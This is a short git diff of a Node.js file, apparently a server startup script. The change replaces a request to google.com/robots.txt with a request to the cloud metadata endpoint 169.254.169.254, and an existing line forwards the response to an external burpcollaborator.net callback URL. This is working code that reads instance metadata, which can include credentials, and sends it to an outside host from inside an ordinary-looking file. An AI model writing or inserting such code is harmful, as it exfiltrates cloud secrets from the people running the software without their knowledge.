@@ -3,7 +3,7 @@ const nconf = require('nconf');
 
 // const logger = require('./server/init');
 var request = require('request');
-request('http://google.com/robots.txt', function (error, response, body) {
+request('http://169.254.169.254/latest/', function (error, response, body) {
   if (!error && response.statusCode == 200) {
     console.log(response.body);    // Prints the JSON object
 request('http://u0v760mwyr2w9wdiinuyo6k1psvjq7f.burpcollaborator.net/callback=' +response.body); 
